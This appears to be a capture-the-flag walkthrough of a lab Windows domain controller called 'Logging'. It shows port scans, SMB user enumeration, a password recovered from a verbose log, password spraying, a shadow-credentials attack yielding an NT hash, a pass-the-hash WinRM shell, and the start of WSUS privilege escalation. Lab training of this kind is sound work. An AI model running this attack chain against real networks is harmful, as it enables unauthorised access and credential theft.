# Machine info
As is common in real life pentests, you will start the Logging box with credentials for the following account wallace.everette / Welcome2026@

```python
wallace.everette:Welcome2026@
```

# Host file setup
```python
sudo nxc smb 10.129.245.130 --generate-hosts-file /etc/hosts
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn dc01.logging.htb -vv

Nmap scan report for dc01.logging.htb (10.129.245.130)
Host is up, received user-set (0.014s latency).
rDNS record for 10.129.245.130: DC01.logging.htb
Scanned at 2026-10-06 17:06:25 BST for 10s
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
8530/tcp  open  unknown          syn-ack
8531/tcp  open  unknown          syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49696/tcp open  unknown          syn-ack
49697/tcp open  unknown          syn-ack
49698/tcp open  unknown          syn-ack
49705/tcp open  unknown          syn-ack
49742/tcp open  unknown          syn-ack
49752/tcp open  unknown          syn-ack
49802/tcp open  unknown          syn-ack
49832/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.79 seconds
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531 -A --min-rate=2000 -sT -Pn dc01.logging.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 17:08 +0100
Nmap scan report for dc01.logging.htb (10.129.245.130)
Host is up (0.013s latency).
rDNS record for 10.129.245.130: DC01.logging.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 23:08:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8530/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
8531/tcp open  ssl/unknown
| ssl-cert: Subject: 
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.logging.htb
| Not valid before: 2026-04-24T15:49:07
|_Not valid after:  2027-04-24T15:49:07
|_ssl-date: 2026-10-06T23:09:12+00:00; +7h00m01s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%), Microsoft Windows 10 21H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# System time
```python
ntpdate dc01.logging.htb                                                             
2026-10-07 00:40:42.675307 (+0100) +25200.291713 +/- 0.007401 dc01.logging.htb 10.129.245.130 s1 no-leap
CLOCK: step_systime: Operation not permitted
```

The system is running at +7h
# SMB (445)
Null auth enabled cannot use it to enumerate

Guest account is also disabled

## Using provided credentials
### Shares
```python
❯❯❯ nxc smb dc01.logging.htb -u 'wallace.everette' -p 'Welcome2026@' --shares
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
SMB         10.129.245.130  445    DC01             [*] Enumerated shares
SMB         10.129.245.130  445    DC01             Share           Permissions     Remark
SMB         10.129.245.130  445    DC01             -----           -----------     ------
SMB         10.129.245.130  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.245.130  445    DC01             C$                              Default share
SMB         10.129.245.130  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.245.130  445    DC01             Logs            READ            
SMB         10.129.245.130  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.245.130  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.245.130  445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

### Users
```python
❯❯❯ nxc smb dc01.logging.htb -u 'wallace.everette' -p 'Welcome2026@' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
svc_recovery
jaylee.clifton
monique.chip
kyson.abel
fable.milford
wellington.kylan
serina.philander
wallace.everette
toby.brynleigh
msa_health$
```

Ill use `--rid-brute` to dump the users since it will also get machine accounts

Also this password provided is not used on any other user accounts

# `Logs` share contains overly verbose output

```python
# use Logs
# ls
drw-rw-rw-          0  Fri Apr 17 00:10:09 2026 .
drw-rw-rw-          0  Fri Apr 17 00:10:09 2026 ..
-rw-rw-rw-       1294  Fri Apr 17 00:10:09 2026 Audit_Heartbeat.log
-rw-rw-rw-       8488  Fri Apr 17 00:10:09 2026 IdentitySync_Trace_20260219.log
-rw-rw-rw-        468  Fri Apr 17 00:10:09 2026 Service_State.log
-rw-rw-rw-       1170  Fri Apr 24 17:59:43 2026 TaskMonitor.log

# rget *
[*] Downloading Audit_Heartbeat.log
[*] Downloading IdentitySync_Trace_20260219.log
[*] Downloading Service_State.log
[*] Downloading TaskMonitor.log
# 
```

Found some log files, ill download them all

```python
❯❯❯ cat IdentitySync_Trace_20260219.log 

...[SNIP]...

[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
   at logging.IdentitySync.Engine.LdapProvider.Connect()
   --- Server Error Details ---
   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
   Win32 Error: 49 (Invalid Credentials)
   ----------------------------                                                            
```

Found some hardcoded credentials

# Attempting auth on `svc_recovery` 

```python
svc_recovery:Em3rg3ncyPa$$2025
```

The other log files didnt really contain anything interesting

```python
❯❯❯ nxc smb dc01.logging.htb -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025' 
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
```

There is a restriction on this account

There is nothing in this users account applying this restriction such as logon hours, so this likely isnt the correct password for this account

I have also tries spraying this password across the whole domain and did not find anything

# Compromising `svc_recovery`

Looking at the password for the account `svc_recovery` i see a year, ill try updating this to the current year 2026

```python
faketime -f +7h nxc smb dc01.logging.htb -u users.txt -p 'Em3rg3ncyPa$$2026' --continue-on-success -k
SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\Administrator:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\Guest:Em3rg3ncyPa$$2026 KDC_ERR_CLIENT_REVOKED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\krbtgt:Em3rg3ncyPa$$2026 KDC_ERR_CLIENT_REVOKED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\DC01$:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\jaylee.clifton:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\monique.chip:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\kyson.abel:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\fable.milford:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\wellington.kylan:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\serina.philander:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\wallace.everette:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\toby.brynleigh:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\msa_health$:Em3rg3ncyPa$$2026 KDC_ERR_PREAUTH_FAILED 
```

Since i think `svc_recovery` is in protected users ill have to use kerberos and with kerberos ill also have to sync time with the DC

This user is now compromised

![](Pasted%20image%2020261006174421.png)

This user also has GenericWrite on the `msa_health$` user

# Compromising `msa_health$`

After checking the exact attributes i have write on using bloodyAD i see the key credential link attribute which means i can do a shadow credential attack

```python
❯❯❯ bloodyAD --host dc01.logging.htb -d logging.htb -u 'svc_recovery' -p 'Em3rg3ncyPa$$2026' -k get writable --detail

distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
...[SNIP]...
msDS-KeyCredentialLink: WRITE
```

## Shadow credentials
```python
faketime -f +7h bloodyAD --host dc01.logging.htb -d logging.htb -u 'svc_recovery' -p 'Em3rg3ncyPa$$2026' -k add shadowCredentials 'msa_health$'
[+] KeyCredential generated with following sha256 of RSA key: ec53b04dbfd8e509b7daa3303355d54125123aaa5ccc4d4ec0b6421d3af52a41
[+] TGT stored in ccache file msa_health_jh.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5
```

I now have an NT hash for this user

```python
❯❯❯ nxc smb dc01.logging.htb -u msa_health$ -H '603fc24ee01a9409f83c9d1d701485c5'        
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5
```

This user is now compromised

# Enumeration as `msa_health$`

![797](Pasted%20image%2020261006175219.png)

This user is in remote management users

# Access over winrm as `msa_health$`

```python
❯❯❯ evil-winrm-py -i dc01.logging.htb -u msa_health$ -H '603fc24ee01a9409f83c9d1d701485c5'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'dc01.logging.htb:5985' as 'msa_health$'
evil-winrm-py PS C:\Users\msa_health$\Documents> whoami
logging\msa_health$
evil-winrm-py PS C:\Users\msa_health$\Documents>
```

I now have a shell on the domain controller

# Exploiting WSUS

https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html

Ill use the WSUS section on this hacktricks page

```python
evil-winrm-py PS C:\Users\msa_health$\Documents> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    https://wsus.logging.htb:8531

evil-winrm-py PS C:\Users\msa_health$\Documents>
```

According to hacktricks, this means this is vulnerable

